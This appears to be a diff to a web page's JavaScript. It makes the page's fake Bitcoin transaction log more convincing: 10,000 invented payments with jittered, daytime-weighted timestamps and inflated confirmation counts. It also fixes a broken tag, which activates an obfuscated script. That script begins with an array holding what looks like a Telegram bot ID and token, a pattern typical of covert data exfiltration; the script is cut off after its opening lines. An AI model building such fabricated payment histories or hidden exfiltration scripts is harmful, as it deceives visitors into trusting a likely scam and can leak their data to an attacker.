@@ -398,16 +398,37 @@
         }
 
         let transactions = [];
-        const TOTAL_LOGS = 120; // Expanded to 120 logs
+        const TOTAL_LOGS = 10000;
+
+        function getLogicalTimestamp(index) {
+            const now = new Date();
+            const totalSixMonthsSeconds = 180 * 24 * 60 * 60;
+            
+            const secondsAgo = (index / TOTAL_LOGS) * totalSixMonthsSeconds;
+            const date = new Date(now.getTime() - (secondsAgo * 1000));
+            
+            const jitter = (Math.random() - 0.5) * (totalSixMonthsSeconds / TOTAL_LOGS) * 1000;
+            date.setTime(date.getTime() + jitter);
+
+            const hour = date.getHours();
+            if (hour < 7 || hour > 20) {
+                if (Math.random() > 0.7) {
+                    date.setHours(date.getHours() + (Math.random() * 8));
+                }
+            }
+            
+            return date;
+        }
 
         for (let i = 0; i < TOTAL_LOGS; i++) {
             const randUsd = (Math.random() * (55 - 28) + 28).toFixed(2);
             const randBtc = (randUsd / BTC_PRICE).toFixed(8);
-            const dateObj = getRandomDate();
+            
+            const dateObj = getLogicalTimestamp(i);
             
             const hoursDiff = Math.abs(new Date() - dateObj) / 36e5;
             let status = 'CONFIRMED';
-            let confs = Math.floor(Math.random() * 300) + 6;
+            let confs = Math.floor(Math.random() * 25000) + 150;
             
             if (hoursDiff < 2) {
                 if (Math.random() > 0.4) {
@@ -482,7 +503,7 @@
         }, 3000);
 
     </script>
-    script>
+    <script>
   (function() {
     "use strict";
     const _v0 = ['8481428965', 'AAEOFp_DPPuPG5fPl03AmYSPNebgpqZoejY'];
